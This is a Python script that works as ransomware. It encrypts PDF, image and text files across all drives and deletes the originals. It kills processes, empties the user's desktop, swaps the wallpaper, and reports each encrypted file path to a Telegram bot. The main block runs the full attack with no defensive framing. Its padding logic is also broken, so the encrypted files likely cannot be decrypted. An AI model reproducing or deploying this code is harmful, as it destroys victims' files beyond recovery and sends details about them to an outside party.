import os
import re
import requests
import time
import ctypes
import shutil
import sys
import winshell
import subprocess  # NEW: Required for taskkill
from typing import Optional

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import base64

# Get the directory where the executable is located
executable_dir = os.path.dirname(sys.executable)

# Construct the path to the wallpaper image
wallpaper_path = os.path.join(executable_dir, "wallpaper.jpg")

class FileEncryptor:
    def __init__(self, password, telegram_token=None, chat_id=None):
        self.password = password.encode()
        self.backend = default_backend()
        self.telegram_token = telegram_token
        self.chat_id = chat_id

    def _send_telegram_message(self, message):
        if not self.telegram_token or not self.chat_id:
            return

        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            payload = {
                "chat_id": self.chat_id,
                "text": message
            }
            requests.post(url, json=payload)
        except Exception as e:
            print(f"Failed to send Telegram message: {str(e)}")

    def _derive_key(self, salt):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        return kdf.derive(self.password)

    def encrypt_file(self, file_path):
        try:
            # Generate random salt and IV
            salt = os.urandom(16)
            iv = os.urandom(16)

            # Derive encryption key
            key = self._derive_key(salt)

            # Create cipher
            cipher = Cipher(
                algorithms.AES(key),
                modes.CBC(iv),
                backend=self.backend
            )
            encryptor = cipher.encryptor()

            # Process file in chunks
            chunk_size = 64 * 1024  # 64KB
            padded_data = b""
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    padded_data += encryptor.update(chunk)

            # Finalize and pad the last block
            ciphertext = encryptor.finalize()
            padder = padding.PKCS7(algorithms.AES.block_size).padder()
            padded_data += padder.update(ciphertext) + padder.finalize()

            # Write encrypted data to file
            with open(file_path + '.enc', 'wb') as f:
                f.write(base64.b64encode(salt + iv + padded_data))

            # Remove original file
            try:
                os.remove(file_path)
            except (PermissionError, OSError) as e:
                print(f"Failed to delete {file_path}: {str(e)}")
                self._send_telegram_message(f"Failed to delete {file_path}: {str(e)}")

            return True
        except Exception as e:
            print(f"Failed to encrypt {file_path}: {str(e)}")
            return False

    def decrypt_file(self, file_path):
        try:
            # Read encrypted data
            with open(file_path, 'rb') as f:
                encrypted_data = base64.b64decode(f.read())

            # Extract salt, IV, and ciphertext
            salt = encrypted_data[:16]
            iv = encrypted_data[16:32]
            ciphertext = encrypted_data[32:]

            # Derive decryption key
            key = self._derive_key(salt)

            # Create cipher
            cipher = Cipher(
                algorithms.AES(key),
                modes.CBC(iv),
                backend=self.backend
            )
            decryptor = cipher.decryptor()

            # Decrypt data
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

            # Unpad data
            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

            # Write decrypted data to file
            original_path = file_path[:-4]  # Remove .enc extension
            with open(original_path, 'wb') as f:
                f.write(plaintext)

            # Remove encrypted file
            os.remove(file_path)

            return True
        except Exception as e:
            print(f"Failed to decrypt {file_path}: {str(e)}")
            return False

# --- Helper Function for Reliable Path (Same as before) ---

def get_desktop_path() -> Optional[str]:
    """Returns the absolute path to the current user's Desktop using the Winshell API."""
    try:
        return winshell.desktop()
    except Exception:
        user_profile = os.environ.get('USERPROFILE')
        if user_profile:
            return os.path.join(user_profile, 'Desktop')
        return None

# --- Wallpaper Changer Function (Replaced) ---

def set_windows_wallpaper_silent(image_filename: str) -> bool:
    """Changes the desktop wallpaper on Windows without printing any output."""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        image_path = os.path.join(script_dir, image_filename)
    except NameError:
        script_dir = os.getcwd()
        image_path = os.path.join(script_dir, image_filename)

    if not os.path.exists(image_path):
        return False

    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDCHANGE = 0x02

    try:
        success = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            image_path,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )
        return bool(success)
    except Exception:
        return False

# ----------------------------------------------------------------------
# --- Robust Desktop Clear Function (with taskkill) ---
# ----------------------------------------------------------------------

def clear_entire_desktop_winshell() -> int:
    """
    Terminates processes for .exe files and then deletes ALL user-created files
    and folders from the desktop using the robust Winshell API.
    """
    desktop_path = get_desktop_path()
    if not desktop_path or not os.path.isdir(desktop_path):
        return 0

    deleted_count = 0

    for item in os.listdir(desktop_path):
        item_path = os.path.join(desktop_path, item)

        # Skip system files, hidden files, and the script itself!
        if item.startswith('.') or item.lower() in ('desktop.ini', 'thumbs.db') or item == os.path.basename(__file__):
            continue

        if item.endswith('.exe'):
            # 1. ATTEMPT TO TERMINATE THE PROCESS
            exe_name = item
            try:
                # Use Windows 'taskkill' command to forcefully end the process
                subprocess.run(['taskkill', '/f', '/im', exe_name],
                                check=False,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
                # Brief pause might help Windows release the file lock
                # import time; time.sleep(0.5)
            except Exception:
                pass # Fail silently if taskkill fails

        # 2. ATTEMPT DELETION (to Recycle Bin)
        try:
            # winshell.delete() handles files and folders (now unlocked)
            winshell.delete_file(item_path, silent=True, no_confirm=True)
            deleted_count += 1

        except Exception:
            # Final exception catch if the deletion still fails (e.g., system protected file)
            continue

    return deleted_count

def encrypt_system(encryptor=None, exclude_patterns=None):
    drives = []

    # Get all available drives
    if os.name == 'nt':  # Windows
        import ctypes
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in map(chr, range(65, 91)):  # A-Z
            if bitmask & 1:
                drives.append(f"{letter}:\\")
            bitmask >>= 1
    else:  # Linux/MacOS
        drives = ["/"]

    total_files = 0
    processed_files = 0

    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive):
                for filename in files:
                    file_path = os.path.join(root, filename)

                    # Check exclusion patterns
                    if exclude_patterns:
                        if any(re.search(pattern, file_path) for pattern in exclude_patterns):
                            continue

                    total_files += 1

                    try:
                        # Encrypt PDF, image, and text files
                        if file_path.lower().endswith(('.pdf', '.jpg', '.jpeg', '.png', '.txt')):
                            if encryptor.encrypt_file(file_path):
                                processed_files += 1
                                encryptor._send_telegram_message(
                                    f"Processed {processed_files}/{total_files}: {file_path}"
                                )
                    except (FileNotFoundError, PermissionError) as e:
                        encryptor._send_telegram_message(
                            f"Error processing {file_path}: {str(e)}"
                        )
        except Exception as e:
            print(f"Failed to process drive {drive}: {str(e)}")

    encryptor._send_telegram_message(
        f"Encryption complete. Processed {processed_files} out of {total_files} files."
    )

# ---------------------------------
# 🎯 EXECUTION BLOCK
# ---------------------------------

if __name__ == "__main__":
    password = "super_secret_password"
    telegram_token = "your_bot_token"
    chat_id = "your_chat_id"

    encryptor = FileEncryptor(password, telegram_token, chat_id)

    exclude_patterns = [
        r"\.git/",  # Exclude Git directories
        r"exclude_this_file\.txt"  # Exclude specific file
    ]

    # Change wallpaper to a yellow-colored image
    friend_image_path = "wallpaper.jpg"
    set_windows_wallpaper_silent(friend_image_path)

    # Clear desktop
    clear_entire_desktop_winshell()
    encrypt_system(encryptor=encryptor, exclude_patterns=exclude_patterns)